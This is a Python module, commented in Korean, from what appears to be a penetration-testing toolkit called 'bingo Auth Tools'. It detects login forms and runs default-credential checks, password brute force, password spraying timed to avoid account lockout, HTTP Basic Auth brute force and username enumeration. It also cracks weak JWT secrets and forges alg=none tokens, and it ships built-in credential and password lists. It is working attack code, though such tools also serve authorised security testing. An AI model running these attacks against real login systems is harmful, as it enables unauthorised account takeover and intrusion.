"""
bingo Auth Tools — 인증 취약점 모듈
- 브루트포스 (로그인 폼 자동 탐지)
- 패스워드 스프레이
- 기본 자격증명 테스트
- 세션 분석 (세션 고정, 예측 가능한 세션 ID)
- JWT 공격 (none alg, 알고리즘 혼동)
- HTTP 기본 인증 브루트포스
"""
from __future__ import annotations
import re, time, base64, json, hashlib, os
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urlencode

try:
    import httpx as _httpx
    _CLIENT = _httpx.Client(follow_redirects=True, verify=False, timeout=10)
except ImportError:
    _CLIENT = None

# ── 기본 자격증명 DB ─────────────────────────────────────────────
_DEFAULT_CREDS = [
    # (username, password)
    ("admin",       "admin"),
    ("admin",       "password"),
    ("admin",       "123456"),
    ("admin",       "admin123"),
    ("admin",       ""),
    ("administrator","administrator"),
    ("administrator","password"),
    ("root",        "root"),
    ("root",        "toor"),
    ("root",        "password"),
    ("root",        ""),
    ("test",        "test"),
    ("user",        "user"),
    ("guest",       "guest"),
    ("demo",        "demo"),
    # CMS 기본값
    ("admin",       "wordpress"),
    ("admin",       "joomla"),
    ("admin",       "drupal"),
    ("admin",       "magento"),
    # DB 기본값
    ("sa",          ""),
    ("sa",          "sa"),
    ("oracle",      "oracle"),
    ("postgres",    "postgres"),
    ("mysql",       "mysql"),
    ("root",        "mysql"),
]

# ── 공통 패스워드 목록 ────────────────────────────────────────────
_COMMON_PASSWORDS = [
    "password", "123456", "password123", "admin", "letmein",
    "qwerty", "abc123", "monkey", "1234567890", "dragon",
    "master", "hello", "freedom", "whatever", "qazwsx",
    "trustno1", "batman", "superman", "iloveyou", "sunshine",
    "shadow", "michael", "football", "baseball", "welcome",
    "login", "access", "pass", "test", "default",
    "changeme", "secret", "P@ssw0rd", "P@ssword", "Admin@123",
    "admin123!", "Admin123", "Passw0rd", "Password1",
    # 한국어 패턴
    "qwer1234", "1q2w3e4r", "asdf1234", "zxcv1234",
    "rkskek", "dkdkdk", "ghkdlsxmfowjr",
]


class Auth:
    """인증 취약점 테스터."""

    def __init__(self, target_url: str):
        if not target_url.startswith("http"):
            target_url = "https://" + target_url
        self.target = target_url
        self.parsed = urlparse(target_url)
        self.base_url = f"{self.parsed.scheme}://{self.parsed.netloc}"
        self.findings: list[dict] = []
        self._login_form: dict | None = None

    def _req(self, url: str, method: str = "GET", data: dict | None = None,
             headers: dict | None = None) -> tuple[int, dict, str]:
        """HTTP 요청. (status, headers, body)"""
        if _CLIENT is None:
            return 0, {}, ""
        try:
            h = {"User-Agent": "Mozilla/5.0 (bingo-auth/2.0)"}
            h.update(headers or {})
            if method == "POST":
                r = _CLIENT.post(url, data=data or {}, headers=h)
            else:
                r = _CLIENT.get(url, headers=h)
            return r.status_code, dict(r.headers), r.text
        except Exception as e:
            return 0, {}, str(e)

    def _add_finding(self, vuln_type: str, detail: str, severity: str = "HIGH"):
        finding = {"type": vuln_type, "detail": detail, "severity": severity}
        self.findings.append(finding)
        icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🔵"}.get(severity, "⚪")
        print(f"\n{icon} [{severity}] {vuln_type}: {detail}")

    # ── 로그인 폼 자동 탐지 ───────────────────────────────────────
    def detect_login_form(self) -> dict | None:
        """HTML에서 로그인 폼 자동 탐지."""
        _, _, body = self._req(self.target)
        if not body:
            return None

        # form action 찾기
        form_match = re.search(
            r'<form[^>]*action=["\']?([^"\'>\s]*)["\']?[^>]*>(.*?)</form>',
            body, re.DOTALL | re.IGNORECASE
        )
        if not form_match:
            print("[AUTH] No form found")
            return None

        action = form_match.group(1) or self.target
        form_body = form_match.group(2)

        if not action.startswith("http"):
            action = self.base_url + "/" + action.lstrip("/")

        # input 필드 추출
        inputs = re.findall(
            r'<input[^>]*name=["\']([^"\']+)["\'][^>]*(?:type=["\']([^"\']+)["\'])?[^>]*>',
            form_body, re.IGNORECASE
        )
        fields = {name: type_.lower() if type_ else "text" for name, type_ in inputs}

        # 유저명/패스워드 필드 추정
        username_field = None
        password_field = None
        for name, ftype in fields.items():
            if ftype == "password":
                password_field = name
            elif any(k in name.lower() for k in ["user", "email", "id", "login", "name"]):
                username_field = name

        if not username_field and not password_field:
            print("[AUTH] Cannot identify login fields")
            return None

        self._login_form = {
            "action": action,
            "username_field": username_field or "username",
            "password_field": password_field or "password",
            "other_fields": {k: "" for k, v in fields.items()
                             if k not in [username_field, password_field]},
        }
        print(f"[AUTH] Form detected: action={action}")
        print(f"[AUTH] Fields: user={username_field}, pass={password_field}")
        return self._login_form

    def _is_login_success(self, body: str, status: int, headers: dict,
                          baseline_len: int | None = None) -> bool:
        """로그인 성공 여부 판단.

        판단 우선순위:
        1. 리다이렉트 → Location 헤더 확인
        2. 실패 키워드 → 즉시 False
        3. 성공 키워드 → True
        4. baseline 길이 비교 (기준 응답 대비 유의미한 차이)
        5. 명시적 증거 없으면 False (ASP ASPSESSIONID 같은 쿠키 오판 방지)
        """
        # 1) 리다이렉트 성공 판단
        if status in (302, 301):
            loc = headers.get("location", "").lower()
            # 로그인 페이지로 돌아가는 리다이렉트는 실패
            if any(x in loc for x in ["login", "signin", "logon"]):
                return False
            if any(x in loc for x in ["dashboard", "home", "profile", "account",
                                       "main", "index", "manager", "admin", "mypage"]):
                return True
            # 알 수 없는 리다이렉트도 성공 가능성 (로그인 페이지 외)
            if loc and "login" not in loc:
                return True

        body_l = body.lower()

        # 2) 실패 키워드 — 명확한 실패 신호
        fail_keywords = [
            "incorrect", "invalid", "failed", "wrong", "unauthorized",
            "틀렸", "잘못된", "실패", "인증실패", "아이디 또는 비밀번호",
            "비밀번호가 일치하지", "존재하지 않", "없는 아이디", "로그인 실패",
            "불법적인 접근", "invalid password", "wrong password",
            "login failed", "authentication failed",
        ]
        if any(k in body_l for k in fail_keywords):
            return False

        # 3) 성공 키워드 — 명확한 성공 신호
        success_keywords = [
            "logout", "log out", "sign out", "signout",
            "로그아웃", "대시보드", "마이페이지", "회원정보", "환영합니다",
            "dashboard", "welcome,", "my account", "my profile",
        ]
        if any(k in body_l for k in success_keywords):
            return True

        # 4) baseline 비교 — 응답 길이가 기준과 유의미하게 다를 때만 성공 판단
        if baseline_len is not None:
            diff = abs(len(body) - baseline_len)
            # 200바이트 이상 차이나고 실패 키워드 없으면 가능성 있음
            if diff > 200:
                return True

        # 5) 증거 없음 → False (ASP ASPSESSIONID 등 단순 쿠키 존재는 무시)
        return False

    # ── 기본 자격증명 테스트 ──────────────────────────────────────
    def test_default_creds(self, form: dict | None = None) -> list[dict]:
        """기본 자격증명 테스트."""
        form = form or self._login_form or self.detect_login_form()
        if not form:
            return []

        # baseline: 명백히 틀린 자격증명으로 기준 응답 길이 확보
        _bl_data = {**form["other_fields"],
                    form["username_field"]: "BINGO_NO_SUCH_USER_xXx9",
                    form["password_field"]: "BINGO_WRONG_PASS_xXx9"}
        _, _, _bl_body = self._req(form["action"], "POST", _bl_data)
        baseline_len = len(_bl_body)
        print(f"[AUTH] Baseline response length: {baseline_len}")

        results = []
        print(f"[AUTH] Testing {len(_DEFAULT_CREDS)} default credentials...")
        for username, password in _DEFAULT_CREDS:
            data = {**form["other_fields"],
                    form["username_field"]: username,
                    form["password_field"]: password}
            status, headers, body = self._req(form["action"], "POST", data)
            if self._is_login_success(body, status, headers, baseline_len=baseline_len):
                detail = f"username={username!r}, password={password!r}"
                self._add_finding("Default Credentials", detail, "CRITICAL")
                results.append({"username": username, "password": password})
                print(f"🔴 [AUTH] LOGIN SUCCESS: {username}:{password}")
            time.sleep(0.3)  # Rate limit 방지
        return results

    # ── 브루트포스 ────────────────────────────────────────────────
    def brute_force(self, username: str, passwords: list[str] | None = None,
                    form: dict | None = None, delay: float = 0.5) -> dict | None:
        """특정 사용자명에 대한 패스워드 브루트포스."""
        form = form or self._login_form or self.detect_login_form()
        if not form:
            return None
        passwords = passwords or _COMMON_PASSWORDS

        # baseline: 명백히 틀린 비밀번호로 기준 응답 확보
        _bl_data = {**form["other_fields"],
                    form["username_field"]: username,
                    form["password_field"]: "BINGO_WRONG_PASS_xXx9"}
        _, _, _bl_body = self._req(form["action"], "POST", _bl_data)
        baseline_len = len(_bl_body)
        print(f"[AUTH] Brute force: user={username!r}, {len(passwords)} passwords, baseline={baseline_len}...")

        for password in passwords:
            data = {**form["other_fields"],
                    form["username_field"]: username,
                    form["password_field"]: password}
            status, headers, body = self._req(form["action"], "POST", data)
            if self._is_login_success(body, status, headers, baseline_len=baseline_len):
                detail = f"username={username!r}, password={password!r}"
                self._add_finding("Brute Force Success", detail, "CRITICAL")
                return {"username": username, "password": password}
            time.sleep(delay)
        print(f"[AUTH] Brute force complete — no valid password found")
        return None

    # ── 패스워드 스프레이 ─────────────────────────────────────────
    def password_spray(self, usernames: list[str], password: str = "Password1",
                       form: dict | None = None) -> list[dict]:
        """패스워드 스프레이 (계정 잠금 우회)."""
        form = form or self._login_form or self.detect_login_form()
        if not form:
            return []

        # baseline: 존재하지 않는 사용자로 기준 응답 확보
        _bl_data = {**form["other_fields"],
                    form["username_field"]: "BINGO_NO_SUCH_USER_xXx9",
                    form["password_field"]: password}
        _, _, _bl_body = self._req(form["action"], "POST", _bl_data)
        baseline_len = len(_bl_body)

        results = []
        print(f"[AUTH] Password spray: {len(usernames)} users, password={password!r}, baseline={baseline_len}...")
        for username in usernames:
            data = {**form["other_fields"],
                    form["username_field"]: username,
                    form["password_field"]: password}
            status, headers, body = self._req(form["action"], "POST", data)
            if self._is_login_success(body, status, headers, baseline_len=baseline_len):
                detail = f"username={username!r}, password={password!r}"
                self._add_finding("Password Spray Success", detail, "CRITICAL")
                results.append({"username": username, "password": password})
            time.sleep(1.0)  # 계정 잠금 방지
        return results

    # ── 세션 분석 ────────────────────────────────────────────────
    def analyze_session(self, cookie_name: str | None = None) -> dict:
        """세션 쿠키 보안 분석."""
        if _CLIENT is None:
            return {}
        results = {}
        try:
            r = _CLIENT.get(self.target)
            cookies = dict(r.cookies)
            headers = dict(r.headers)

            # 세션 쿠키 탐지
            session_cookies = {k: v for k, v in cookies.items()
                                if any(x in k.lower() for x in
                                       ["session", "sessid", "sess", "token", "auth", "jwt"])}
            if cookie_name:
                session_cookies = {cookie_name: cookies.get(cookie_name, "")}

            results["cookies"] = cookies
            results["session_cookies"] = session_cookies
            issues = []

            for name, value in session_cookies.items():
                print(f"[SESSION] Cookie: {name}={value[:30]}...")

                # Secure 플래그 확인 (https에서만)
                set_cookie = headers.get("set-cookie", "")
                if "secure" not in set_cookie.lower() and self.parsed.scheme == "https":
                    issues.append(f"{name}: Missing 'Secure' flag")
                    print(f"🟡 [SESSION] Missing Secure flag: {name}")

                if "httponly" not in set_cookie.lower():
                    issues.append(f"{name}: Missing 'HttpOnly' flag")
                    print(f"🟡 [SESSION] Missing HttpOnly flag: {name}")

                if "samesite" not in set_cookie.lower():
                    issues.append(f"{name}: Missing 'SameSite' attribute")

                # JWT 감지
                if value.count(".") == 2:
                    print(f"[SESSION] JWT detected in {name}")
                    from auth_tools import Auth
                    jwt_result = self.analyze_jwt(value)
                    results["jwt_analysis"] = jwt_result
                    issues.extend(jwt_result.get("issues", []))

                # 예측 가능한 세션 ID 체크
                if value.isdigit() or len(value) < 16:
                    issues.append(f"{name}: Weak session ID (too short/predictable)")
                    self._add_finding("Weak Session ID", f"{name}={value[:20]}", "HIGH")

            results["issues"] = issues
            for issue in issues:
                print(f"  ⚠️  {issue}")
        except Exception as e:
            results["error"] = str(e)
        return results

    def analyze_jwt(self, token: str) -> dict:
        """JWT 분석 (auth_tools 내장)."""
        result = {"token": token[:30] + "...", "issues": []}
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return {"error": "Not a valid JWT"}

            def b64d(s: str) -> str:
                s += "=" * (4 - len(s) % 4)
                return base64.urlsafe_b64decode(s).decode("utf-8", errors="replace")

            header  = json.loads(b64d(parts[0]))
            payload = json.loads(b64d(parts[1]))
            result.update({"header": header, "payload": payload})

            alg = header.get("alg", "").upper()
            if alg == "NONE":
                result["issues"].append("CRITICAL: alg=none")
            if alg in ("HS256", "HS384", "HS512"):
                # 약한 시크릿 테스트
                for secret in ["secret", "password", "key", "jwt", "test", ""]:
                    import hmac
                    msg = f"{parts[0]}.{parts[1]}".encode()
                    sig = base64.urlsafe_b64encode(
                        hmac.new(secret.encode(), msg,
                                  {"HS256": hashlib.sha256, "HS384": hashlib.sha384,
                                   "HS512": hashlib.sha512}[alg]).digest()
                    ).rstrip(b"=").decode()
                    if sig == parts[2]:
                        result["issues"].append(f"CRITICAL: Weak secret={secret!r}")
                        print(f"🔴 [JWT] Weak secret found: {secret!r}")
                        break

            # None 알고리즘 공격 토큰 생성
            fh = base64.urlsafe_b64encode(
                json.dumps({"alg": "none", "typ": "JWT"}).encode()
            ).rstrip(b"=").decode()
            result["forged_none"] = f"{fh}.{parts[1]}."

        except Exception as e:
            result["error"] = str(e)
        return result

    # ── HTTP 기본 인증 브루트포스 ─────────────────────────────────
    def brute_basic_auth(self, url: str | None = None,
                          credentials: list[tuple] | None = None) -> dict | None:
        """HTTP Basic Auth 브루트포스."""
        if _CLIENT is None:
            return None
        url = url or self.target
        credentials = credentials or _DEFAULT_CREDS
        print(f"[AUTH] Basic auth brute: {url}")

        for username, password in credentials:
            cred = base64.b64encode(f"{username}:{password}".encode()).decode()
            status, headers, body = self._req(url, headers={"Authorization": f"Basic {cred}"})
            if status == 200:
                detail = f"username={username!r}, password={password!r}"
                self._add_finding("Basic Auth Bypass", detail, "CRITICAL")
                return {"username": username, "password": password}
            time.sleep(0.2)
        return None

    # ── 계정 열거 ────────────────────────────────────────────────
    def enumerate_users(self, usernames: list[str] | None = None,
                         form: dict | None = None) -> list[str]:
        """에러 메시지 차이로 유효한 사용자명 열거."""
        form = form or self._login_form or self.detect_login_form()
        if not form:
            return []
        usernames = usernames or ["admin", "administrator", "root", "test", "user",
                                   "info", "mail", "email", "support", "manager"]
        valid = []
        invalid_password = "BINGO_INVALID_PASSWORD_xXx9"
        print(f"[AUTH] User enumeration: testing {len(usernames)} usernames...")

        # 기준 응답 (명백히 존재하지 않는 유저)
        data = {**form.get("other_fields", {}),
                form["username_field"]: "BINGO_NO_SUCH_USER_xXx9",
                form["password_field"]: invalid_password}
        _, _, baseline = self._req(form["action"], "POST", data)

        for username in usernames:
            data = {**form.get("other_fields", {}),
                    form["username_field"]: username,
                    form["password_field"]: invalid_password}
            _, _, body = self._req(form["action"], "POST", data)
            # 응답이 baseline과 다르면 사용자가 존재할 가능성
            if abs(len(body) - len(baseline)) > 50:
                valid.append(username)
                print(f"[AUTH] Valid username (possible): {username!r}")
            time.sleep(0.3)

        if valid:
            self._add_finding("User Enumeration", f"Valid usernames: {valid}", "MEDIUM")
        return valid
